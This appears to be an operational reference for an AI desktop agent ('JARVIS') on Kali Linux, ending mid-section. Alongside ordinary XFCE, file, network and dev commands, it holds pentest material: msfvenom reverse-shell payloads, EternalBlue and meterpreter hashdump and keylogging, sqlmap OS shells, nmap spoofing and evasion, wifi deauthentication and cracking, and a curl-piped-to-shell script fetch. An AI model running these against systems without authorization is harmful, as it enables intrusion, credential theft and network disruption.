# Kali Linux + XFCE — Operational Reference

This is the authoritative reference for the system JARVIS runs on. When a command exists here, prefer it over what you recall from training. Commands that open windows, start processes, read files, or query state should be executed via Bash — never read aloud to the user; tell them the RESULT, not the command.

---

## 0. Environment JARVIS already has

- `DISPLAY=:0.0` (X11 session, Xorg)
- `DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus`
- `XDG_RUNTIME_DIR=/run/user/1000`
- `XAUTHORITY=$HOME/.Xauthority`
- Shell: `zsh` (interactive). Use `bash -c "..."` for non-interactive scripting unless zsh syntax is specifically needed.
- Package repo base: Kali rolling (`http.kali.org/kali`).

So **every GUI command in this document works directly** via Bash — no extra env setup needed.

---

## 1. Desktop control (XFCE 4)

### Menus & launchers
```
xfce4-popup-whiskermenu         # Open the Whisker application menu (this system's default)
xfce4-popup-applicationsmenu    # Classic apps menu (may be unbound on this host)
xfce4-popup-windowmenu          # Windows list
xfce4-popup-directorymenu       # Directory browser popup
xfce4-appfinder                 # Full-screen app search (like macOS Spotlight)
gtk-launch firefox-esr          # Launch by .desktop base name (no extension)
dex /usr/share/applications/foo.desktop   # Launch a specific .desktop file
```

### Windows / workspaces
```
wmctrl -l                       # List all open windows (id, desktop, host, title)
wmctrl -a "Firefox"             # Activate/focus first window whose title contains "Firefox"
wmctrl -c "Slack"               # Close that window gracefully
wmctrl -s 2                     # Switch to workspace #2
wmctrl -d                       # List workspaces
xdotool search --name "Chrome" windowactivate --sync
xdotool getactivewindow getwindowname
xdotool key super                # Send the Super key
xdotool type "hello world"       # Type text into focused window
xdotool key ctrl+c
```

### Panel / taskbar / system tray
```
xfce4-panel -r                  # Restart the XFCE panel (fixes frozen tray)
xfce4-panel --quit              # Kill panel (respawns via session)
xfce4-panel --preferences       # Open panel settings
xfwm4 --replace &               # Restart the window manager
```

### Notifications
```
notify-send "Title" "body text"
notify-send -i dialog-warning "Warning" "something happened"
notify-send -u critical "URGENT" "please check"
notify-send -t 10000 "Title" "body"           # 10-second timeout
```

### Screenshots
```
xfce4-screenshooter -f -s /tmp/shot.png       # Full screen, save to path
xfce4-screenshooter -w -s /tmp/shot.png       # Active window
xfce4-screenshooter -r -s /tmp/shot.png       # Rectangle selection (prompts user)
xfce4-screenshooter -d 5 -f -s /tmp/shot.png  # 5-second delay
maim /tmp/shot.png                             # Alternative (X11 only)
grim /tmp/shot.png                             # Wayland equivalent
```

### Clipboard
```
xclip -selection clipboard -o                  # Read clipboard
echo "text" | xclip -selection clipboard      # Set clipboard
xclip -selection clipboard -t image/png -i < /tmp/shot.png   # Put image on clipboard
xsel --clipboard --output                      # Alternative (xsel)
wl-copy / wl-paste                             # Wayland equivalents
```

### XFCE settings via xfconf (no GUI)
```
xfconf-query -l                                # List all channels
xfconf-query -c xfce4-desktop -l               # List properties in a channel
xfconf-query -c xfwm4 -p /general/theme -s "Adwaita-dark"
xfconf-query -c xsettings -p /Net/ThemeName -s "Adwaita-dark"
xfconf-query -c xsettings -p /Gtk/FontName -s "Sans 11"
xfconf-query -c xfce4-keyboard-shortcuts -l    # All keyboard shortcuts
```

### Display / resolution
```
xrandr                          # List displays, resolutions, modes
xrandr --output HDMI-1 --mode 1920x1080 --rate 60
xrandr --output eDP-1 --primary
xrandr --output HDMI-1 --right-of eDP-1
xrandr --listmonitors
ddcutil detect                  # External-monitor brightness/contrast via DDC
ddcutil setvcp 10 75            # Brightness → 75%
brightnessctl set 50%           # Laptop-panel backlight
```

---

## 2. Browsers & web

### Launching with specific profile / URL / flags
```
xdg-open "https://example.com"                            # Default browser
google-chrome-stable "https://youtube.com"                # Chrome stable
google-chrome-stable --new-window "https://example.com"
google-chrome-stable --incognito "https://example.com"
google-chrome-stable --profile-directory="Default" "https://..."
google-chrome-stable --app="https://calendar.google.com"  # SSB mode
firefox-esr -new-tab -url "https://example.com"
firefox-esr --private-window "https://example.com"
chromium --help | less                                    # Full flag list
```

### Current tab (Chrome via debug port if already running with --remote-debugging-port=9222)
```
curl -s http://localhost:9222/json  | jq '.[] | {url, title}'
# Requires chrome launched with --remote-debugging-port=9222
```

---

## 3. File navigation

### find / fd
```
find /path -type f -name "*.log" -mtime -1
find . -type f -size +100M -exec ls -lh {} \;
find . -name "*.py" -not -path "*/.venv/*"
fd -e md                                 # all .md files
fd -H -I node_modules                    # include hidden + ignored
fd -x cat {} \; -e json                  # execute per match
```

### grep / ripgrep
```
grep -rIn --color "pattern" src/
rg "pattern"                             # faster, respects .gitignore
rg -l "pattern"                          # files only
rg -i -w "word" --glob "!*.min.js"
rg --json "pattern" | jq '.data.lines.text'
```

### tree / broot / ncdu
```
tree -L 2 -a
broot                                    # interactive tree nav
ncdu /home                               # disk-usage analyzer
```

### bat / less / head / tail
```
bat /etc/hosts                           # syntax-highlighted cat
bat -A file                              # show all chars incl whitespace
tail -f /var/log/syslog
tail -F /var/log/nginx/access.log        # survives rotation
less +F file                             # like tail -f but scrollable
less +G file                             # jump to end
```

### File & path metadata
```
file /bin/bash                           # type
stat -c '%U %G %a %s %y' path            # owner group perms size mtime
readlink -f /bin/sh                      # resolve symlink chain
realpath .
```

---

## 4. Processes & services

### Listing / finding
```
ps aux                                   # all processes
ps -eo pid,user,%cpu,%mem,cmd --sort=-%cpu | head
pgrep -af firefox                        # full cmdline match
pidof firefox
lsof -p $$                               # files open by current shell
lsof -i :8080                            # who has port 8080
lsof /home/ulrich/Documents              # who has files under that path
```

### Control
```
kill <pid>                               # SIGTERM (graceful)
kill -9 <pid>                            # SIGKILL
kill -HUP <pid>                          # reload config for daemons
pkill -f "python.*server.py"             # by pattern
killall firefox
nice -n 10 heavy-job.sh                  # lower priority
renice +15 -p <pid>
taskset -c 0-3 cmd                       # pin to CPUs 0-3
```

### Systemd / journal
```
systemctl status                         # overview
systemctl list-units --type=service --state=running
systemctl status NetworkManager
sudo systemctl restart NetworkManager
sudo systemctl enable --now tor.service
systemctl --user status jarvis-*.service
journalctl -u NetworkManager --since "30 min ago"
journalctl -p err -b                     # errors since last boot
journalctl -f                            # follow everything
journalctl _PID=1234                     # by pid
```

### Top / htop / btop
```
top
htop                                     # interactive
btop                                     # prettier htop
iotop                                    # IO monitor (needs sudo)
bandwhich                                # per-process bandwidth
```

---

## 5. Package management (Kali / Debian)

### apt / apt-get
```
sudo apt update
sudo apt upgrade
sudo apt full-upgrade                    # allows removals on conflict
sudo apt install <pkg>
sudo apt install -y <pkg>                # non-interactive
sudo apt remove <pkg>
sudo apt purge <pkg>                     # remove + wipe config
sudo apt autoremove
sudo apt-mark hold <pkg>                 # prevent upgrades
apt search <term>
apt show <pkg>
apt list --installed
apt list --upgradable
```

### dpkg
```
dpkg -l | grep <pkg>                     # list installed matching
dpkg -L <pkg>                            # files installed by pkg
dpkg -S /path/to/file                    # which pkg owns this file
dpkg-query -W -f='${Package}\t${Version}\n' | grep <pkg>
sudo dpkg -i foo.deb
sudo dpkg --configure -a                 # fix interrupted installs
```

### Repos
```
cat /etc/apt/sources.list
ls /etc/apt/sources.list.d/
sudo apt-key list                        # (deprecated)
ls /etc/apt/trusted.gpg.d/               # signing keys
```

### Kali metapackages (install categorized tool sets)
```
sudo apt install kali-linux-default      # the standard desktop image set
sudo apt install kali-linux-everything   # EVERYTHING — ~15 GB
sudo apt install kali-tools-top10        # top 10 pentest tools
sudo apt install kali-tools-web          # web-app pentesting
sudo apt install kali-tools-passwords    # password cracking suite
sudo apt install kali-tools-wireless     # wifi / RF
sudo apt install kali-tools-forensics
sudo apt install kali-tools-reverse-engineering
sudo apt install kali-tools-exploitation
```

See [kali.org/tools/all-tools](https://www.kali.org/tools/all-tools/) for the full Kali tool catalog.

### snap / flatpak / pipx (if installed)
```
snap list
flatpak list
pipx list
pipx install black
cargo install ripgrep
```

---

## 6. Security / pentest tools (Kali headliners)

These are the tools Kali ships. Only invoke against assets Ulrich owns or has written authorization for. Active scans against third-party hosts are legally fraught.

### Recon / scan
```
nmap -sV -Pn -T4 <target>                # version detect, no ping, fast
nmap -sC -A -p- <target>                 # script + service detection, all ports
nmap -sU -p 53,67,123,161 <target>       # UDP
masscan -p 0-65535 <target> --rate 10000 # faster but louder
rustscan -a <target> -- -A -sV           # modern nmap wrapper
whatweb <url>                            # HTTP fingerprint
wafw00f <url>                            # WAF detection
```

### Web
```
nikto -h <url>                           # HTTP scanner
gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt
dirsearch -u <url>
ffuf -u https://FUZZ.example.com -w subdomains.txt
sqlmap -u "<url>?id=1" --batch --dbs
sqlmap -u <url> --data "user=a&pass=b" --forms --batch
wpscan --url <url> --enumerate u
burpsuite                                # Burp (GUI)
```

### Passwords / hashes
```
john --wordlist=rockyou.txt hashes.txt
john --show hashes.txt
hashcat -m 0 -a 0 hash.txt rockyou.txt   # -m 0 = MD5
hashcat -m 1000 nt.txt rockyou.txt       # -m 1000 = NTLM
hashid <hash>
hashcat --help | grep -i mode | less     # all hash modes
hydra -l admin -P rockyou.txt <target> http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"
/usr/share/wordlists/                    # default wordlist location
```

### Exploitation
```
msfconsole                               # Metasploit
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe
searchsploit <cve>                       # Exploit-DB offline search
searchsploit -m <path>                   # copy exploit locally
```

### Wireless
```
airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 6 --bssid <MAC> -w cap wlan0mon
aireplay-ng --deauth 5 -a <BSSID> wlan0mon
aircrack-ng -w wordlist.txt cap.cap
reaver -i wlan0mon -b <BSSID> -vv         # WPS
```

### Sniffing / MITM
```
wireshark                                # GUI
tshark -i eth0 -c 100
tcpdump -i eth0 -w out.pcap
bettercap -iface eth0
ettercap -T -q -i eth0
mitmproxy
```

### Forensics
```
binwalk firmware.bin                     # extract embedded file systems
foremost -i image.dd -o out/             # file carving
volatility -f memdump --profile=Win10 pslist   # memory forensics (Volatility 2)
vol.py -f memdump pslist                 # Volatility 3
autopsy                                  # disk forensics GUI
```

---

## 7. Networking

### Interfaces & IPs
```
ip addr                                  # all interfaces
ip -br -c addr                           # compact, color
ip link set eth0 up
ip addr add 192.168.1.10/24 dev eth0
ip route                                 # routing table
ip -s link show eth0                     # interface stats
nmcli device status
nmcli connection show
nmcli connection up id "MyWifi"
nmcli device wifi list
nmcli device wifi connect "SSID" password "pass"
iwconfig wlan0                           # wireless status (deprecated-ish)
iw dev wlan0 link
rfkill list                              # wifi/BT soft/hard blocks
```

### Ports / sockets
```
ss -tlnp                                 # TCP listening, with PID
ss -tlnp | grep :8080
ss -tupn                                 # TCP+UDP + programs
ss -s                                    # socket summary
lsof -i -P -n | grep LISTEN
netstat -tulpen                          # legacy
```

### DNS
```
dig example.com
dig +short example.com
dig @8.8.8.8 example.com
dig example.com ANY
drill example.com                        # alternative
host example.com
nslookup example.com
getent hosts example.com                 # resolves via nsswitch
systemd-resolve --status                 # (or resolvectl)
cat /etc/resolv.conf
```

### Ping / trace
```
ping -c 4 example.com
ping -I eth0 8.8.8.8                     # force interface
mtr example.com                          # interactive traceroute
traceroute example.com
tracepath example.com                    # no root needed
nc -zv example.com 443                   # port check
```

### HTTP
```
curl -I https://example.com              # headers only
curl -sSL -o out.html https://example.com
curl -X POST -H 'Content-Type: application/json' -d '{"a":1}' https://api/
curl --resolve example.com:443:1.2.3.4 https://example.com/   # DNS override
curl -w "%{time_total}\n" -o /dev/null -s https://example.com  # timing
wget -c https://example.com/file.iso     # continue partial download
xh get example.com                       # httpie-like but in Rust
```

### Firewall
```
sudo ufw status verbose
sudo ufw enable
sudo ufw allow 22
sudo ufw allow from 192.168.1.0/24 to any port 8080
sudo iptables -L -n -v                   # current rules
sudo iptables -S                         # rules in save format
sudo nft list ruleset                    # nftables
```

### SSH
```
ssh user@host
ssh -p 2222 user@host
ssh -L 8080:localhost:80 user@host       # local forward
ssh -R 9000:localhost:22 user@host       # reverse forward
ssh -D 1080 user@host                    # SOCKS proxy
ssh-copy-id user@host
ssh-keygen -t ed25519 -C "ulrich@jarvis"
scp file.txt user@host:/remote/path
rsync -avz --progress dir/ user@host:/backup/
```

### WireGuard (home lab on wg0)
```
sudo wg                                  # status
sudo wg show wg0
sudo wg-quick up wg0
sudo wg-quick down wg0
sudo systemctl status wg-quick@wg0
```

---

## 8. Users, permissions, sudo

```
id
whoami
groups
sudo -l                                  # what can I sudo?
sudo -u otheruser bash
sudo -i                                  # interactive root shell
sudo visudo                              # edit sudoers safely
chmod 755 file                           # rwxr-xr-x
chmod u+x,g-w file
chown user:group file
chown -R user:group dir/
chgrp group file
setfacl -m u:alice:rwx file              # extended ACL
getfacl file
umask                                    # default create mask
adduser newuser                          # interactive
usermod -aG sudo user                    # add to sudo group
passwd                                   # change own
sudo passwd user                         # change someone else's
```

---

## 9. Filesystem / storage

```
lsblk -f                                 # block devices + FS + UUID
df -h                                    # disk free
du -sh *                                 # size per entry
du -h --max-depth=1 /var | sort -h
sudo fdisk -l
sudo parted -l
sudo blkid                               # UUIDs and types
mount                                    # currently mounted
findmnt                                  # prettier mount tree
sudo mount /dev/sdb1 /mnt
sudo umount /mnt
sudo mount -o remount,rw /
sudo fsck /dev/sdb1
sudo mkfs.ext4 /dev/sdb1
sudo mkfs.vfat -F32 /dev/sdb1
smartctl -a /dev/sda                     # SMART status
hdparm -I /dev/sda
```

### Snapshots / LVM / btrfs (if used)
```
sudo lvs
sudo vgs
sudo pvs
sudo btrfs subvolume list /
sudo btrfs subvolume snapshot -r /home /home_snap
```

### Archives
```
tar cf out.tar dir/
tar czf out.tar.gz dir/                  # gzip
tar cJf out.tar.xz dir/                  # xz
tar --zstd -cf out.tar.zst dir/          # zstd
tar xf any.tar.{gz,xz,bz2,zst}
zip -r out.zip dir/
unzip out.zip
7z a out.7z dir/
7z x out.7z
```

---

## 10. Audio (PipeWire on this system)

```
pw-cli info 0                            # pipewire alive?
pw-cli list-objects | less
pw-top                                   # per-node CPU
pactl info
pactl list short sources                 # input devices
pactl list short sinks                   # output devices
pactl list short sink-inputs             # active playback streams
pactl list short source-outputs          # active capture streams
pactl get-default-sink
pactl get-default-source
pactl set-default-sink <name>
pactl set-default-source <name>
pactl set-sink-volume @DEFAULT_SINK@ 50%
pactl set-sink-volume @DEFAULT_SINK@ +5%
pactl set-sink-mute @DEFAULT_SINK@ toggle
pactl load-module module-echo-cancel aec_method=webrtc source_name=mic_aec sink_name=sink_aec
pactl unload-module <id>
pavucontrol                              # GUI volume control
alsamixer                                # ALSA fallback
```

---

## 11. Kernel / hardware

```
uname -a
lsb_release -a
hostnamectl
cat /etc/os-release
dmesg --human --follow                   # kernel log (needs sudo)
dmesg | grep -i error | tail
lspci
lspci -k                                 # kernel drivers used
lsusb
lsusb -t                                 # tree
lshw -short                              # needs sudo
hwinfo --short
inxi -Fxz                                # compact hw summary
sensors                                  # temperature (needs lm-sensors)
nvidia-smi                               # NVIDIA if present
vainfo                                   # video acceleration
glxinfo | grep -i renderer               # OpenGL driver
```

---

## 12. Logs

```
journalctl -b                            # current boot
journalctl -b -1                         # previous boot
journalctl -p warning                    # warnings+
journalctl --disk-usage
journalctl --vacuum-time=2weeks
/var/log/syslog
/var/log/auth.log                        # sudo, login, sshd
/var/log/dpkg.log                        # package installs
/var/log/apt/history.log                 # apt history
/var/log/xorg.0.log
~/.xsession-errors                       # GUI app stderr
```

---

## 13. Cron / systemd timers / at

```
crontab -l                               # user crontab
crontab -e                               # edit (uses $EDITOR)
sudo crontab -l -u root
cat /etc/crontab
ls /etc/cron.{hourly,daily,weekly,monthly}/
systemctl list-timers
at now + 10 minutes                      # one-shot task at time
at -l                                    # list scheduled
```

---

## 14. Dev tooling

### Git
```
git status
git log --oneline --graph --decorate -20
git diff
git diff --staged
git add -p                               # interactive staging
git commit -v                            # verbose w/ diff
git push
git pull --rebase
git stash
git stash pop
git switch -c feature/x
git restore path                         # undo working tree
git restore --staged path                # unstage
git reset --hard HEAD                    # nuke local (careful)
git bisect start
gh pr create
gh pr checkout <num>
gh run list
```

### Docker / Podman
```
docker ps
docker ps -a
docker run --rm -it ubuntu:22.04 bash
docker exec -it <ctr> bash
docker logs -f <ctr>
docker image ls
docker system df
docker system prune -f
docker compose up -d
docker compose logs -f
podman ps                                # daemonless alternative
```

### Python / Node / Rust
```
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
pipx install black
node --version
npm install
npm run dev
bun install
bun run dev
cargo check
cargo test
cargo build --release
```

### tmux
```
tmux new -s work
tmux ls
tmux attach -t work
# Inside tmux:
#   Ctrl-b d        detach
#   Ctrl-b c        new window
#   Ctrl-b ,        rename window
#   Ctrl-b %        split vertical
#   Ctrl-b "        split horizontal
#   Ctrl-b [        copy mode (pgup/pgdn to scroll)
```

---

## 15. Quick recipes (daily ops)

### Kill whatever is on a port
```
fuser -k 8080/tcp
# or
lsof -ti :8080 | xargs -r kill -9
```

### Find biggest files/dirs
```
du -ah / 2>/dev/null | sort -rh | head -20
ncdu /
```

### Restart a frozen X session (without rebooting)
```
pkill -KILL -u "$USER"   # nuclear — kills your session
# Safer:
xfwm4 --replace &        # just restart the WM
xfce4-panel -r           # just restart the panel
```

### Open the file manager at a specific path
```
thunar /home/ulrich/Documents
```

### Say/read text aloud (offline)
```
espeak "hello"
spd-say "hello from speech dispatcher"
```

### Quick HTTP server
```
python3 -m http.server 8000
```

### Pretty-print JSON / YAML
```
cat file.json | jq .
cat file.yaml | yq .
```

### Generate / check hashes
```
sha256sum file
sha256sum -c checksums.txt
md5sum file
```

### Secure delete
```
shred -u -n 3 file                       # overwrite 3x then unlink
```

### Quick VPN off / on
```
sudo systemctl stop wg-quick@wg0
sudo systemctl start wg-quick@wg0
```

### Turn Bluetooth on/off
```
rfkill block bluetooth
rfkill unblock bluetooth
bluetoothctl
# Inside:
#   power on
#   scan on
#   pair <MAC>
#   connect <MAC>
```

### Mount a remote SSH dir locally
```
sshfs user@host:/remote/path /mnt/point
fusermount -u /mnt/point
```

---

## 16. Things that DON'T work on this system (noted so you don't try them)

- `snap` is not installed — use `apt` or `flatpak` instead.
- `systemd-resolved` not always running — `/etc/resolv.conf` is the source of truth.
- Wayland is not the default session — scripts that assume `wl-copy` / `grim` / `swaymsg` will fail. This is **X11 + XFCE**.
- `gnome-*` commands (gnome-terminal, gsettings) usually work but settings won't persist to XFCE config.
- `zenity` GUI dialogs are available; `kdialog` is not.
- `selinux` is not enforcing; AppArmor isn't loaded by default either.

---

## 17. Escalation summary

- Root is available via `sudo` (password required per Ulrich's sudoers config).
- Don't run `sudo rm -rf`, `sudo dd`, disk-overwrite, or `--force` against anything not explicitly authorized by Ulrich for THIS turn.
- For package installs over ~100 MB, check the dependency tree first with `apt-get install --dry-run <pkg>` and mention the download size before proceeding.
- For commands that need a password, announce that you'll need one — the agent can't type an interactive password, so Ulrich must run it himself or configure passwordless sudo for the specific command.

---

## 18. When a command produces nothing visible

Common causes:
- GUI commands run but a popup was dismissed or menu auto-closes on focus-loss — re-invoke with the panel focused.
- `xfce4-popup-applicationsmenu` silently no-ops if the classic menu plugin isn't in the panel. On this system, use `xfce4-popup-whiskermenu`.
- Output redirected to `/dev/null` in a wrapper — check the raw command.
- Needs `&` to detach from the shell, otherwise blocks the agent.
- DBUS address missing — verify `DBUS_SESSION_BUS_ADDRESS` in the subprocess env.

Always verify the effect: `wmctrl -l`, `pgrep -f <app>`, or `xdotool search --name "<title>"`. Don't say "opened" unless you can see it.

---

## 19. nmap — deep reference

### Scan types
```
nmap -sS <t>                 # SYN (stealth) — default as root
nmap -sT <t>                 # Full-TCP connect — no root needed
nmap -sU <t>                 # UDP (slow, usually with -p)
nmap -sA <t>                 # ACK — firewall rule detection
nmap -sW <t>                 # Window
nmap -sN / -sF / -sX <t>     # NULL / FIN / Xmas — IDS evasion
nmap -sY <t>                 # SCTP INIT
nmap -sO <t>                 # IP protocol scan
nmap -sn <t>                 # Ping sweep only (host discovery)
nmap -Pn <t>                 # Skip host discovery, assume alive
nmap -PS22,80,443 <t>        # TCP-SYN ping on those ports
nmap -PE <t>                 # ICMP echo only
nmap -PP <t>                 # ICMP timestamp
```

### Ports
```
-p-                          # All 65535
-p 22,80,443
-p 1-1024
-p- --top-ports 1000         # combine
-F                           # Fast scan (100 ports)
--exclude-ports 80,443
```

### Service / OS detect
```
nmap -sV <t>                 # Version detect on open ports
nmap --version-intensity 9 <t>   # 0-9; 9 = all probes
nmap -O <t>                  # OS fingerprint (needs root)
nmap -A <t>                  # -sV -O --script=default --traceroute combo
```

### Timing / throttling
```
-T0  paranoid (IDS-slow, 5+ min per probe)
-T1  sneaky
-T2  polite (slow, shares bandwidth)
-T3  normal (default)
-T4  aggressive (recommended for most networks)
-T5  insane (unreliable; LAN only)
--max-rate 100              # per-second cap
--min-rate 500
--max-retries 2
--host-timeout 5m
```

### Evasion
```
-D RND:10,ME                 # Decoys (random IPs + self)
-S 10.0.0.1                  # Spoof source IP
-e eth0                      # Force interface
--source-port 53             # Spoof source port (53 bypasses weak rules)
-f                           # Fragment packets
--mtu 16                     # Manual MTU fragmentation
--data-length 200            # Pad each probe
--spoof-mac 0 / Dell / apple # Spoof MAC
--randomize-hosts
--badsum                     # Invalid checksum probes
```

### NSE scripts
```
nmap --script default <t>
nmap --script vuln <t>
nmap --script "smb-*" <t>
nmap --script-help <script>
ls /usr/share/nmap/scripts/ | less
nmap --script http-title,http-headers,http-methods -p 80,443 <t>
nmap --script ssl-cert,ssl-enum-ciphers -p 443 <t>
nmap --script smb-os-discovery,smb-enum-shares,smb-vuln-ms17-010 -p 445 <t>
nmap --script ftp-anon,ftp-brute -p 21 <t>
nmap --script dns-brute --script-args dns-brute.domain=example.com
```

### Output
```
-oN out.txt                  # Human-readable
-oX out.xml                  # XML (parseable)
-oG out.gnmap                # Greppable
-oA base                     # All three: base.nmap, .xml, .gnmap
-v / -vv / -vvv              # verbosity
--reason                     # Why a port was classified
--open                       # Only show open ports
```

### Common workflows
```
sudo nmap -sS -sV -Pn -T4 -p- --min-rate 1000 -oA fullscan <t>
sudo nmap -sC -sV -O -T4 -oA default <t>
sudo nmap -sU --top-ports 20 -oA udp <t>
sudo nmap -sn 10.0.0.0/24 -oA sweep
sudo nmap -p80,443,8080,8443 --script=http-title,http-headers,http-methods,ssl-cert -oA web <t>
```

---

## 20. Metasploit (msfconsole)

### Setup
```
sudo msfdb init              # init Postgres back-end
msfdb status
msfdb run                    # start db + console
msfconsole -q                # quiet start
```

### Inside msfconsole
```
help
search type:exploit platform:windows smb
info exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.0.0.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
check
run -j                       # run as background job
sessions -l
sessions -i 1                # interact with session
background
jobs
jobs -k <id>
```

### Meterpreter
```
sysinfo; getuid; getsystem
hashdump                     # SAM hashes (needs admin/SYSTEM)
shell                        # drop to cmd.exe
upload /local /remote
download /remote /local
migrate <pid>
keyscan_start / keyscan_dump / keyscan_stop
screenshot
run post/multi/recon/local_exploit_suggester
```

### msfvenom
```
msfvenom -l payloads | grep windows/x64/meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf
msfvenom -p python/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o shell.py
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f exe -o out.exe
# bad-chars:
--bad-chars "\x00\x0a\x0d"
# Launch listener alongside:
msfconsole -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT 4444; run"
```

### Resource scripts (auto.rc)
```
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
set ExitOnSession false
run -j
# Run:
msfconsole -qr auto.rc
```

---

## 21. Wireshark / tshark / tcpdump

### tcpdump
```
sudo tcpdump -i any
sudo tcpdump -i eth0 -nn                       # no name/port resolution
sudo tcpdump -i eth0 -c 100
sudo tcpdump -i eth0 -w out.pcap
sudo tcpdump -r out.pcap "port 80"
sudo tcpdump -A "host 10.0.0.5 and port 80"
sudo tcpdump -G 60 -w "cap-%Y%m%d-%H%M%S.pcap" -i eth0   # rotate every 60s
```

### BPF filter syntax
```
host 10.0.0.5
net 10.0.0.0/24
port 443
portrange 8000-8100
src host X and dst port 443
not port 22
tcp[13] & 2 != 0                               # SYN flag
icmp
arp
vlan 10
```

### tshark
```
tshark -i eth0 -c 20
tshark -r cap.pcap -Y "http.request"
tshark -r cap.pcap -T fields -e ip.src -e tcp.dstport -e http.host
tshark -r cap.pcap -z io,stat,1
tshark -r cap.pcap -z conv,tcp
tshark -r cap.pcap -z endpoints,ip
```

### Wireshark display-filter cookbook
```
http.request and ip.addr == 10.0.0.5
http.response.code >= 400
tls.handshake.type == 1                        # ClientHello
dns.qry.name contains "google"
smb2
tcp.flags.syn == 1 and tcp.flags.ack == 0
tcp.analysis.retransmission
frame contains "password"
```

### Extract from pcaps
```
tshark -r cap.pcap --export-objects http,outdir/
tcpflow -r cap.pcap
ngrep -q -W byline -I cap.pcap "PASS|USER|pwd="
```

---

## 22. Burp Suite / ZAP

Burp is mostly GUI.
```
burpsuite                                      # launch
burpsuite --project-file=proj.burp
```
Core flow: Proxy -> browser proxy 127.0.0.1:8080 -> trust Burp CA -> HTTP history -> Send to Repeater / Intruder / Scanner.

OWASP ZAP (free):
```
zaproxy
zap.sh -cmd -quickurl https://example.com -quickout /tmp/zap.html
```

---

## 23. SQLMap deep

```
sqlmap -u "https://site/page?id=1" --batch
sqlmap -u "..." --cookie="PHPSESSID=abc" --level 5 --risk 3
sqlmap -u "..." -p id
sqlmap -u "..." --data "a=1&b=2" --method POST
sqlmap -u "..." -r req.txt                   # replay saved raw request
sqlmap -u "..." --random-agent
sqlmap -u "..." --threads 10
sqlmap -u "..." --proxy=http://127.0.0.1:8080
sqlmap -u "..." --tamper=space2comment,between,randomcase
sqlmap --list-tampers

# Enumeration after confirmation:
sqlmap -u "..." --dbs
sqlmap -u "..." -D <db> --tables
sqlmap -u "..." -D <db> -T <tbl> --columns
sqlmap -u "..." -D <db> -T users --dump
sqlmap -u "..." --dump-all --exclude-sysdbs
sqlmap -u "..." --passwords
sqlmap -u "..." --os-shell
sqlmap -u "..." --sql-shell
sqlmap -u "..." --file-read=/etc/passwd
```

---

## 24. Password cracking — hashcat deep

### Modes (`-m`) common values
```
0    MD5                         1000  NTLM
100  SHA1                        1100  Domain cached credentials
1400 SHA256                      1800  sha512crypt (/etc/shadow)
1700 SHA512                      500   md5crypt (old Linux)
3200 bcrypt                      7400  sha256crypt
22000 WPA-PBKDF2-PMKID+EAPOL     13100 Kerberos TGS (Kerberoasting)
5600 NetNTLMv2                   16800 WPA-PMKID-PBKDF2
7500 Kerberos 5 AS-REQ
```

### Attack modes (`-a`)
```
0  Straight (wordlist)
1  Combinator (two wordlists concatenated)
3  Brute / mask
6  Hybrid wordlist + mask
7  Hybrid mask + wordlist
```

### Mask syntax
```
?l   lowercase a-z
?u   UPPERCASE A-Z
?d   digit 0-9
?s   symbols
?a   all (?l?u?d?s)
?b   byte 0x00-0xff
```

### Common invocations
```
hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 -a 3 hashes.txt ?d?d?d?d?d?d?d?d
hashcat -m 0 -a 3 hashes.txt Summer?d?d?d?s
hashcat -m 22000 wpa.hc22000 rockyou.txt
hashcat --show hashes.txt
hashcat --username -m 1800 shadow.txt wl.txt
hashcat -O                                     # optimized kernels (<32 pw-len)
hashcat -w 3                                   # workload high
hashcat --benchmark
```

### John the Ripper
```
john --format=sha512crypt --wordlist=rockyou.txt shadow.txt
john --show shadow.txt
john --incremental shadow.txt
john --rules=Jumbo --wordlist=wl.txt shadow.txt
unshadow /etc/passwd /etc/shadow > mixed.txt
ssh2john id_rsa > id_rsa.hash
zip2john file.zip > zip.hash
rar2john file.rar > rar.hash
office2john doc.docx > doc.hash
keepass2john kdbx.kdbx > kp.hash
```

### Wordlists on Kali
```
/usr/share/wordlists/rockyou.txt.gz    # gunzip before first use
/usr/share/wordlists/metasploit/
/usr/share/wordlists/dirb/
/usr/share/wordlists/wfuzz/
/usr/share/seclists/Passwords/
/usr/share/seclists/Discovery/
/usr/share/seclists/Usernames/
sudo apt install seclists              # install the big bundle
```

---

## 25. aircrack-ng — wireless

```
sudo airmon-ng check kill
sudo airmon-ng start wlan0                     # wlan0 -> wlan0mon
sudo airodump-ng wlan0mon                      # survey
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Deauth clients:
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
# Crack handshake:
aircrack-ng -w rockyou.txt capture-01.cap
# PMKID-only:
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool pmkid.pcapng -o wpa.hc22000
hashcat -m 22000 wpa.hc22000 rockyou.txt
# Restore:
sudo airmon-ng stop wlan0mon
```

---

## 26. Linux priv-esc checklist

### Enum scripts
```
# linPEAS:
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# LinEnum:
